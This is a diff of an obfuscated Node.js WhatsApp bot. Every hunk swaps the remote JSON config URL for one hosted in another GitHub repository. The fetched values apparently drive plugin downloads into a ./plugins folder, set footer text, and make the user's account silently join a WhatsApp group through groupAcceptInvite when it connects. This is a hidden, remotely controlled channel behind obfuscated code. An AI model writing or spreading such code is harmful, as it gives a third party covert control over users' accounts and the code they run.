@@ -49,7 +49,7 @@ const app = express();
 const port = process.env.PORT || config.PORT;
 const AdmZip = require('adm-zip');
 const connect = async () => {
-  let _0xedcd3f = await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json');
+  let _0xedcd3f = await axios.get('https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json');
   const _0x3c10ea = '' + _0xedcd3f.data.megaurl;
   if (!fs.existsSync("./plugins")) {
     fs.mkdirSync("./plugins", {
@@ -123,7 +123,7 @@ async function connectToWA() {
     upresbtn: _0x403371
   } = require('./lib/database');
   const _0x5ebf5a = config.OWNER_NUMBER;
-  const _0x224c6f = (await axios.get("https://mv-visper-full-db.pages.dev/Main/main_var.json")).data;
+  const _0x224c6f = (await axios.get("https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json")).data;
   const _0x548f85 = '' + _0x224c6f.connectmg;
   const _0x354cd0 = '' + _0x224c6f.cmsglogo;
   const {
@@ -171,7 +171,7 @@ async function connectToWA() {
     } else {
       if (_0x359bc4 === "open") {
         console.log("WA CONNECTED ✅");
-        const _0x2601d4 = (await axios.get('https://mv-visper-full-db.pages.dev/Main/main_var.json')).data;
+        const _0x2601d4 = (await axios.get('https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json')).data;
         const _0x57338c = '' + _0x2601d4.supglink;
         _0x31f351.groupAcceptInvite(_0x57338c);
         console.log("Successful join our support 🧑‍💻");
@@ -489,7 +489,7 @@ async function connectToWA() {
           });
         }
       };
-      const _0x9e0ebe = (await axios.get("https://mv-visper-full-db.pages.dev/Main/main_var.json")).data;
+      const _0x9e0ebe = (await axios.get("https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json")).data;
       config.FOOTER = _0x9e0ebe.footer;
       const _0x3f897a = 'preUser'.split(',');
       const _0x4001cc = [..._0x3f897a].map(_0x37d348 => _0x37d348.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x23727e);
